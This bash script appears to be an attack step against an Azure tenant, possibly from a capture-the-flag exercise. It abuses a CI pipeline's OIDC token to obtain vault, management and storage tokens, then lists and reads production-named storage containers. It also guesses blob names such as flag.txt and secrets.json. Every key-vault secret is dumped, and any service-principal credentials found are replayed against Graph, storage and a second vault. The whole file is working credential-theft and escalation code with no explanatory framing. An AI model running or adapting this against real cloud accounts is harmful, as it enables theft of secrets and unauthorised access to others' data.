#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG1="rg-tbl-platform-prod-sea"

# Get OIDC tokens
OIDC_RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
OIDC_JWT=$(echo "$OIDC_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

get_token() {
  local SCOPE=$1
  curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&scope=${SCOPE}/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC_JWT" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"
}

VAULT=$(get_token "https://vault.azure.net")
MGMT=$(get_token "https://management.azure.com")
STORAGE=$(get_token "https://storage.azure.com")
echo "=== Tokens: vault=${#VAULT} mgmt=${#MGMT} storage=${#STORAGE} ==="

# ====== List blobs in all containers ======
echo ""
echo "=== List blobs: sttblappcfgprodx3euoz/config ==="
curl -sS -m 15 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
  -H "Authorization: Bearer $STORAGE" -H "x-ms-version: 2020-10-02" 2>&1

echo ""
echo "=== List blobs: sttblbackupprodx3euoz/exports ==="
curl -sS -m 15 "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" \
  -H "Authorization: Bearer $STORAGE" -H "x-ms-version: 2020-10-02" 2>&1

echo ""
echo "=== List blobs: sttblcilogsprodx3euoz/logs ==="
curl -sS -m 15 "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" \
  -H "Authorization: Bearer $STORAGE" -H "x-ms-version: 2020-10-02" 2>&1

# ====== Try reading specific blobs ======
echo ""
echo "=== Read: sttblappcfgprodx3euoz/config/internal-config.json ==="
curl -sS -m 15 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" \
  -H "Authorization: Bearer $STORAGE" -H "x-ms-version: 2020-10-02" 2>&1

echo ""
echo "=== Read: sttblbackupprodx3euoz/exports (try common names) ==="
for BLOB in flag.txt flag data-export.json export.json backup.json secrets.json config.json; do
  echo "--- $BLOB ---"
  curl -sS -m 10 "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$BLOB" \
    -H "Authorization: Bearer $STORAGE" -H "x-ms-version: 2020-10-02" 2>&1
done

# Try public access to exports (PublicAccess=blob)
echo ""
echo "=== Public blob reads (no auth) on exports ==="
for BLOB in flag.txt flag data-export.json export.json backup.json secrets.json; do
  echo "--- $BLOB (public) ---"
  curl -sS -m 10 "https://sttblbackupprodx3euoz.blob.core.windows.net/exports/$BLOB" 2>&1
done

# ====== Read KV1 secrets and properly test SP creds ======
echo ""
echo "=== KV1 secrets with credentials ==="
KV1_LIST=$(curl -sS -m 15 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $VAULT")

for SECRET_NAME in $(echo "$KV1_LIST" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for s in d.get('value',[]): print(s['id'].split('/')[-1])
"); do
  SECRET_VAL=$(curl -sS -m 10 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SECRET_NAME?api-version=7.4" \
    -H "Authorization: Bearer $VAULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")

  python3 << PYEOF
import json, urllib.request, urllib.parse

raw = """$SECRET_VAL"""
try:
    d = json.loads(raw)
except:
    print(f"  $SECRET_NAME: parse error")
    d = {}
    exit()

app_id = d.get('appId', '')
client_secret = d.get('clientSecret', '')
tenant = d.get('tenantId', '')

if not app_id or not client_secret:
    print(f"  $SECRET_NAME: missing appId or clientSecret, keys={list(d.keys())}")
    exit()

print(f"  $SECRET_NAME: appId={app_id}")

# Try graph token (for Application.ReadWrite.All)
for scope_name, scope_url in [('graph','https://graph.microsoft.com/.default'), ('mgmt','https://management.azure.com/.default'), ('vault','https://vault.azure.net/.default'), ('storage','https://storage.azure.com/.default')]:
    data = urllib.parse.urlencode({
        'client_id': app_id,
        'client_secret': client_secret,
        'scope': scope_url,
        'grant_type': 'client_credentials'
    }).encode()
    req = urllib.request.Request(f'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token', data=data)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        tok = json.loads(resp.read()).get('access_token', '')
        print(f"    {scope_name}: OK (len={len(tok)})")

        # If vault, try KV2
        if scope_name == 'vault' and tok:
            req2 = urllib.request.Request('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4',
                headers={'Authorization': f'Bearer {tok}'})
            try:
                resp2 = urllib.request.urlopen(req2, timeout=10)
                body = resp2.read().decode()[:1000]
                print(f"    KV2 SECRETS: {body}")
            except urllib.error.HTTPError as e:
                print(f"    KV2: HTTP {e.code}")
            except Exception as e:
                print(f"    KV2: {str(e)[:100]}")

        # If storage, try listing blobs in exports
        if scope_name == 'storage' and tok:
            req3 = urllib.request.Request(
                'https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list',
                headers={'Authorization': f'Bearer {tok}', 'x-ms-version': '2020-10-02'})
            try:
                resp3 = urllib.request.urlopen(req3, timeout=10)
                body = resp3.read().decode()[:2000]
                print(f"    EXPORTS blobs: {body}")
            except urllib.error.HTTPError as e:
                print(f"    EXPORTS: HTTP {e.code}")
            except Exception as e:
                print(f"    EXPORTS: {str(e)[:100]}")

        # If graph, check roles
        if scope_name == 'graph' and tok:
            # Decode JWT to see roles
            import base64
            parts = tok.split('.')
            pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
            try:
                claims = json.loads(base64.urlsafe_b64decode(pad))
                roles = claims.get('roles', [])
                print(f"    graph roles: {roles}")
            except:
                print(f"    graph: could not decode JWT")

    except urllib.error.HTTPError as e:
        body = e.read().decode()[:200]
        print(f"    {scope_name}: HTTP {e.code} - {body[:100]}")
    except Exception as e:
        print(f"    {scope_name}: FAIL - {str(e)[:100]}")
PYEOF
done

echo ""
echo "=== DONE ==="
